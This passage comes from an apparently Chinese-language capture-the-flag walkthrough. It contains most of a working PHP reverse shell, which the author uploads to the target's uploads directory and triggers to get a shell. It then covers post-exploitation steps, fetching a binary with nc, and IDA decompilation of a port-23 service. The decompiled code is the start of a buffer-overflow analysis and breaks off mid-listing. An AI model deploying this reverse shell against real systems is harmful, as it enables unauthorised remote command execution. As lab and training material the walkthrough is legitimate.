data-num="103"></td><td><pre>	<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="104"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="105"></td><td><pre></pre></td></tr><tr><td data-num="106"></td><td><pre><span class="token comment">// Spawn shell process</span></pre></td></tr><tr><td data-num="107"></td><td><pre><span class="token variable">$descriptorspec</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="108"></td><td><pre>   <span class="token number">0</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">// stdin is a pipe that the child will read from</span></pre></td></tr><tr><td data-num="109"></td><td><pre>   <span class="token number">1</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">// stdout is a pipe that the child will write to</span></pre></td></tr><tr><td data-num="110"></td><td><pre>   <span class="token number">2</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span>   <span class="token comment">// stderr is a pipe that the child will write to</span></pre></td></tr><tr><td data-num="111"></td><td><pre><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="112"></td><td><pre></pre></td></tr><tr><td data-num="113"></td><td><pre><span class="token variable">$process</span> <span class="token operator">=</span> <span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">,</span> <span class="token variable">$descriptorspec</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="114"></td><td><pre></pre></td></tr><tr><td data-num="115"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_resource</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="116"></td><td><pre>	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Can't spawn shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="117"></td><td><pre>	<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="118"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="119"></td><td><pre></pre></td></tr><tr><td data-num="120"></td><td><pre><span class="token comment">// Set everything to non-blocking</span></pre></td></tr><tr><td data-num="121"></td><td><pre><span class="token comment">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span></pre></td></tr><tr><td data-num="122"></td><td><pre><span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="123"></td><td><pre><span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="124"></td><td><pre><span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="125"></td><td><pre><span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="126"></td><td><pre></pre></td></tr><tr><td data-num="127"></td><td><pre><span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successfully opened reverse shell to <span class="token interpolation"><span class="token variable">$ip</span></span>:<span class="token interpolation"><span class="token variable">$port</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="128"></td><td><pre></pre></td></tr><tr><td data-num="129"></td><td><pre><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="130"></td><td><pre>	<span class="token comment">// Check for end of TCP connection</span></pre></td></tr><tr><td data-num="131"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="132"></td><td><pre>		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Shell connection terminated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="133"></td><td><pre>		<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="134"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="135"></td><td><pre></pre></td></tr><tr><td data-num="136"></td><td><pre>	<span class="token comment">// Check for end of STDOUT</span></pre></td></tr><tr><td data-num="137"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="138"></td><td><pre>		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Shell process terminated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="139"></td><td><pre>		<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="140"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="141"></td><td><pre></pre></td></tr><tr><td data-num="142"></td><td><pre>	<span class="token comment">// Wait until a command is end down $sock, or some</span></pre></td></tr><tr><td data-num="143"></td><td><pre>	<span class="token comment">// command output is available on STDOUT or STDERR</span></pre></td></tr><tr><td data-num="144"></td><td><pre>	<span class="token variable">$read_a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="145"></td><td><pre>	<span class="token variable">$num_changed_sockets</span> <span class="token operator">=</span> <span class="token function">stream_select</span><span class="token punctuation">(</span><span class="token variable">$read_a</span><span class="token punctuation">,</span> <span class="token variable">$write_a</span><span class="token punctuation">,</span> <span class="token variable">$error_a</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="146"></td><td><pre></pre></td></tr><tr><td data-num="147"></td><td><pre>	<span class="token comment">// If we can read from the TCP socket, send</span></pre></td></tr><tr><td data-num="148"></td><td><pre>	<span class="token comment">// data to process's STDIN</span></pre></td></tr><tr><td data-num="149"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="150"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SOCK READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="151"></td><td><pre>		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="152"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SOCK: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="153"></td><td><pre>		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="154"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="155"></td><td><pre></pre></td></tr><tr><td data-num="156"></td><td><pre>	<span class="token comment">// If we can read from the process's STDOUT</span></pre></td></tr><tr><td data-num="157"></td><td><pre>	<span class="token comment">// send data down tcp connection</span></pre></td></tr><tr><td data-num="158"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="159"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDOUT READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="160"></td><td><pre>		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="161"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDOUT: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="162"></td><td><pre>		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="163"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="164"></td><td><pre></pre></td></tr><tr><td data-num="165"></td><td><pre>	<span class="token comment">// If we can read from the process's STDERR</span></pre></td></tr><tr><td data-num="166"></td><td><pre>	<span class="token comment">// send data down tcp connection</span></pre></td></tr><tr><td data-num="167"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="168"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDERR READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="169"></td><td><pre>		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="170"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDERR: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="171"></td><td><pre>		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="172"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="173"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="174"></td><td><pre></pre></td></tr><tr><td data-num="175"></td><td><pre><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="176"></td><td><pre><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="177"></td><td><pre><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="178"></td><td><pre><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="179"></td><td><pre><span class="token function">proc_close</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="180"></td><td><pre></pre></td></tr><tr><td data-num="181"></td><td><pre><span class="token comment">// Like print, but does nothing if we've daemonised ourself</span></pre></td></tr><tr><td data-num="182"></td><td><pre><span class="token comment">// (I can't figure out how to redirect STDOUT like a proper daemon)</span></pre></td></tr><tr><td data-num="183"></td><td><pre><span class="token keyword">function</span> <span class="token function-definition function">printit</span> <span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="184"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$daemon</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="185"></td><td><pre>		<span class="token keyword">print</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$string</span></span>\n"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="186"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="187"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="188"></td><td><pre></pre></td></tr><tr><td data-num="189"></td><td><pre><span class="token delimiter important">?></span></span></pre></td></tr></table></figure><p>联想到之前第一处可疑点，再返回查看发现变成了另外一个文件名，猜测就是上传的文件名</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011213829019-72579412.png" alt="" /></p>
<p>这里访问 uploads 目录，会显示下面所有的文件名，只有这一个，而且还有上传时间，也能想到这就是我们上传的文件</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011230642206-2029720214.png" alt="" /></p>
<p>访问该文件成功反弹 shell，提权到 tty</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011230733754-1296607199.png" alt="" /></p>
<p>在 /home/fox 下发现一个 flag：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011230747627-435739283.png" alt="" /></p>
<p>查看根目录下文件的权限，发现 root 目录其他用户具有可读权限：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011230813777-724069557.png" alt="" /></p>
<p>进入之后，发现 proof.txt 文件，但是没有权限，还有一个 win 文件可读</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011230828731-660512584.png" alt="" /></p>
<p>查看内容发现每隔三秒运行一下 access.exe 文件</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011230916544-2038902722.png" alt="" /></p>
<p>进入到 /opt/access 目录发现两个文件</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011230932361-1461813295.png" alt="" /></p>
<p>下载到本地，这里使用一种新方法，nc 传输</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011230947055-1181242839.png" alt="" /></p>
<p>也可使用 python 在后台搭建简易 web 服务器：</p>
<pre><code>python -m SimpleHTTPServer 8000 &amp;
</code></pre>
<p>放到 windows 下运行，发现其运行在 23 号端口，一看这是要 pwn 啊</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211011231001266-956669801.png" alt="" /></p>
<p>将程序拖到 ida 里面分析，找到连接 23 端口所打印的字符串位置进行反编译</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword type-declaration">int</span> __stdcall <span class="token function">ConnectionHandler</span><span class="token punctuation">(</span><span class="token constant">LPVOID</span> lpThreadParameter<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword type-declaration">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  size_t v2<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  char Dst<span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-410h]</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  char <span class="token operator">*</span>Dest<span class="token punctuation">;</span> <span class="token comment">// [esp+400h] [ebp-28h]</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword type-declaration">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp+404h] [ebp-24h]</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token keyword type-declaration">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [esp+408h] [ebp-20h]</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token constant">SOCKET</span> s<span class="token punctuation">;</span> <span class="token comment">// [esp+40Ch] [ebp-1Ch]</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token keyword type-declaration">void</span> <span class="token operator">*</span>v8<span class="token punctuation">;</span> <span class="token comment">// [esp+410h] [ebp-18h]</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  char <span class="token operator">*</span>buf<span class="token punctuation">;</span> <span class="token comment">// [esp+414h] [ebp-14h]</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token keyword type-declaration">int</span> len<span class="token punctuation">;</span> <span class="token comment">// [esp+418h] [ebp-10h]</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  unsigned <span class="token keyword type-declaration">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+41Ch] [ebp-Ch]</span></pre></td></tr><tr><td data-num="14"></td><td><pre> </pre></td></tr><tr><td data-num="15"></td><td><pre>  len <span class="token operator">=</span> <span class="token number">4096</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  buf <span class="token operator">=</span> <span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0</span>x1000u<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>  v8 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0</span>x400u<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Dst<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>x3E8u<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>x1000u<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>  s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token constant">SOCKET</span><span class="token punctuation">)</span>lpThreadParameter<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>  result <span class="token operator">=</span> <span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token constant">SOCKET</span><span class="token punctuation">)</span>lpThreadParameter<span class="token punctuation">,</span> <span class="token string double-quoted-string">"Verification Code:\n"</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>  v6 <span class="token operator">=</span> result<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token function">closesocket</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    result <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>  <span class="token keyword">else</span></pre></td></tr><tr><td data-num="29"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">while</span> <span class="token punctuation">(</span> lpThreadParameter <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>      result <span class="token operator">=</span> <span class="token function">recv</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> len<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>      v5 <span class="token operator">=</span> result<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>      <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>      <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        Dest <span class="token operator">=</span> <span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0</span>xB54u<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        <span class="token function">memset</span><span class="token punctuation">(</span>Dest<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>xB54u<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        <span class="token function">strncpy</span><span class="token punctuation">(</span>Dest<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0</span>xB54u<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>          v2 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>Dest<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">&lt;=</span> i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>            <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">77</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre>          <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>            Dest<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>            Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">80</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>          <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre>          <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>            Dest<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>            Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">80</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>          <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">95</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre>          <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>            Dest<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>            Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">80</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>          <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">121</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="60"></td><td><pre>          <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>            Dest<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>            Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">80</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>          <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> Dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">126</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="65"></td><td><pre>          <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="66"></td><td><pre>            Dest<span class="token 